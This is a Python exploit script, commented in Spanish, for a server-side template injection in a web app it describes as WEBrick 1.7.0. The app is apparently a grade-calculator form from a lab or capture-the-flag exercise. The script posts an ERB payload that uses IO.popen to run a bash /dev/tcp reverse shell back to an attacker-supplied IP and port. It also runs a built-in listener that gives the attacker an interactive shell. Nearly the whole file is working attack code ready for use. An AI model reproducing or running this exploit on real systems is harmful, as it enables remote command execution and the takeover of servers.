import socket
import threading
import requests
import argparse

def listener(listener_ip, listener_port):
    """Escucha conexiones entrantes en el puerto especificado."""
    try:
        # Crear socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((listener_ip, listener_port))
        server_socket.listen(1)  # Escuchar solo una conexión

        print(f"[+] Escuchando en {listener_ip}:{listener_port}...")

        # Esperar una conexión entrante
        client_socket, client_address = server_socket.accept()
        print(f"[+] Conexión recibida de {client_address[0]}:{client_address[1]}")

        # Mantener la conexión abierta para interactuar
        while True:
            # Recibir datos
            data = client_socket.recv(1024)
            if not data:
                print("[-] Conexión cerrada por el cliente.")
                break

            print(data.decode(errors="ignore"), end="")

            # Enviar comandos (interacción básica con la shell inversa)
            cmd = input("$ ")
            if cmd.strip().lower() == "exit":
                print("[+] Cerrando conexión.")
                client_socket.close()
                break
            client_socket.sendall(cmd.encode() + b"\n")

    except KeyboardInterrupt:
        print("\n[-] Interrumpido por el usuario. Saliendo...")
    except Exception as e:
        print(f"[-] Error en el listener: {e}")
    finally:
        server_socket.close()
        print("[+] Listener cerrado.")

def exploit_webrick(target_url, target_ip, listener_ip, listener_port):
    """Envía el payload al servidor vulnerable."""
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"http://{target_ip}",
        "Connection": "keep-alive",
        "Referer": target_url,
        "Upgrade-Insecure-Requests": "1",
    }

    payload = (
        f"category1=aaa%0A<%25%3d+IO.popen("
        f"\"bash+-c+'bash+-i+>%26+/dev/tcp/{listener_ip}/{listener_port}+0>%261'\""
        f").readlines()+%25>&grade1=10&weight1=5&"
        f"category2=bbb&grade2=20&weight2=10&"
        f"category3=ccc&grade3=30&weight3=20&"
        f"category4=ddd&grade4=40&weight4=30&"
        f"category5=eee&grade5=50&weight5=35"
    )

    try:
        print(f"[+] Enviando payload al objetivo {target_url}...")
        response = requests.post(target_url, headers=headers, data=payload, allow_redirects=False)
        print(f"[+] Solicitud enviada. Código de respuesta: {response.status_code}")
    except Exception as e:
        print(f"[-] Error enviando el payload: {e}")

def parse_arguments():
    """Parsea los argumentos de línea de comandos."""
    parser = argparse.ArgumentParser(description="Exploit SSTI para WEBrick 1.7.0 con listener integrado.")
    parser.add_argument("--target", required=True, help="IP del objetivo vulnerable.")
    parser.add_argument("--url", required=True, help="URL completa del endpoint vulnerable.")
    parser.add_argument("--listen", required=True, help="IP en la que el listener estará escuchando.")
    parser.add_argument("--port", required=True, type=int, help="Puerto en el que el listener estará escuchando.")
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_arguments()

    # Crear un hilo para el listener
    listener_thread = threading.Thread(
        target=listener, args=(args.listen, args.port), daemon=True
    )
    listener_thread.start()

    # Ejecutar el exploit
    exploit_webrick(args.url, args.target, args.listen, args.port)

    # Mantener el script en ejecución hasta que se cierre el listener
    try:
        while listener_thread.is_alive():
            listener_thread.join(1)
    except KeyboardInterrupt:
        print("\n[-] Interrumpido por el usuario. Cerrando...")
